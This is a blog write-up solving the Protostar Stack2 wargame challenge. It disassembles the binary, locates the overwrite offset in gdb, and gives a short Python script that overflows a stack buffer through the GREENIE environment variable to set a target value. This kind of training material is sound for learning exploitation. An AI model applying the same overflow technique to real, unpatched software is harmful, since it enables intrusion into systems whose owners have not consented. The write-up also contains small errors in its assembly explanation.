---
title: Protostar - Stack 2
date: 2024-02-14 15:10:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack2]
---


## Conquering Stack2 at Protostar Machine

Greetings, hackers of the digital realm! Today, we will continue our journey on [Protostar](https://exploit.education/protostar) machine  to conquer the [Stack2](https://exploit.education/protostar/stack-two/) binary.

This challenge requiring us to perform a stack overflow and override the next value in the buffer with specific value as we see later.

### **Challenge Overview**
- **Challenge Name:** [Stack2](https://exploit.education/protostar/stack-two/)
- **Machine:** [Protostar](https://exploit.education/protostar)


### Step 1: Explore Binary

![Stack2 Explore](/assets/img/protostar/stack2-explore.png)


### Step 2: Analysis

```sh
objdump -M intel -d /opt/protostar/bin/stack2 | grep '<main>' -A 33
```

![Stack2 Explore](/assets/img/protostar/stack2-analysis.png)

Analysis of `main` Function in `stack2` :

1. Function Prologue:
   - `push ebp`: Save the base pointer.
   - `mov ebp, esp`: Set up a new base pointer.
   - `and esp, 0xfffffff0`: Align the stack.
   - `sub esp, 0x60`: Allocate space for local variables.

2. Function Call to `getenv`:
   - `mov DWORD PTR [esp], 0x80485e0`: Set the argument for `getenv` (environment variable name).
   - `call 804837c <getenv@plt>`: Call the `getenv` function and store the result in `eax`.
   - `mov DWORD PTR [esp+0x5c], eax`: Store the result in the local variable at `[esp+0x5c]`.

3. Conditional Check:
   - `cmp DWORD PTR [esp+0x5c], 0x0`: Compare the value at `[esp+0x5c]` with `0x0`.
   - `jne 80484c8 <main+0x34>`: Jump to `80484c8` if the comparison is not equal.

4. Branch on False:
   - If `jne` is not taken, it means the value at `[esp+0x5c]` is zero.
   - `mov DWORD PTR [esp+0x4], 0x80485e8`: Set the argument for `errx` (error message).
   - `call 80483bc <errx@plt>`: Call the `errx` function and exit.

5. Memory Operations:
   - `mov eax, DWORD PTR [esp+0x5c]`: Move the value at `[esp+0x5c]` to `eax`.
   - `mov DWORD PTR [esp+0x4], eax`: Move the value of `eax` to `[esp+0x4]`.
   - `lea eax, [esp+0x18]`: Compute the effective address of `[esp+0x18]` and store it in `eax`.
   - `mov DWORD PTR [esp], eax`: Move the value of `eax` to `[esp]`.
   - `call 804839c <strcpy@plt>`: Call the `strcpy` function.

6. Memory Comparison:
   - `cmp eax, 0xd0a0d0a`: Compare the result of `strcpy` with `0xd0a0d0a`.
   - `jne 80484fd <main+0x69>`: Jump to `80484fd` if the comparison is not equal.

7. Branch on True:
   - If `jne` is not taken, it means the value matches `0xd0a0d0a`.
   - `mov DWORD PTR [esp], 0x8048618`: Set the argument for `puts` (string to print).
   - `call 80483cc <puts@plt>`: Call the `puts` function.

8. Branch on False:
   - If `jne` is taken, it means the value does not match `0xd0a0d0a`.
   - `mov edx, DWORD PTR [esp+0x58]`: Move the value at `[esp+0x58]` to `edx`.
   - `mov eax, 0x8048641`: Move the address of the format string to `eax`.
   - `mov DWORD PTR [esp+0x4], edx`: Move the value of `edx` to `[esp+0x4]`.
   - `mov DWORD PTR [esp], eax`: Move the value of `eax` to `[esp]`.
   - `call 80483ac <printf@plt>`: Call the `printf` function.
9. Function Epilogue:
   - `leave`: Restore the stack frame (equivalent to `mov esp, ebp` followed by `pop ebp`).
   - `ret`: Return from the function.

1. during run it first call `getenv("GREENIE")` to check env `GREENIE` if provided and if not provided it call errx with a error message which print it and exit 
2. if env var `GREENIE` provided will be copied to buffer
3. check if `[esp+0x58]==0xd0a0d0a` then call puts,print then return and else call print only and return

looks like stack1 but instead of takeing arguments as input it take it as input variable and also the value it compare `esp+0x58c` are just different as it equal `0xd0a0d0a`

so it will be easy , like [My Writeup for Protostar Stack1](/posts/protostar_stack1/)

### Step 3: Debugging
![Stack2 Debug](/assets/img/protostar/stack2-gdb-debug.png)


1. disassemble `main` and set breakpoint on `mov eax,DWORD PTR [esp+0x58]` 
3. run it with `GREENIE env` var assigned to our fuzz paylaod
4. determine which value `dword[esp+0x58]` hold

![Stack2 found offset](/assets/img/protostar/stack2-gdb-found-offset.png)

so we found it contain `0x51515151` which represent ascii`QQQQ`.. Great!

### Step 4: Craft Solution
Now Let,s Craft Solution
write to : `~/fuzz.py`
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
esp_plus_58h="\x0a\x0d\x0a\x0d" # represent 0xd0a0d0a on little endian machines
print(fuzz+esp_plus_58h)
```

now run it
![Stack2 Solved](/assets/img/protostar/stack2-solved.png)

and We Solve it ;) ! Happy Hacking <3
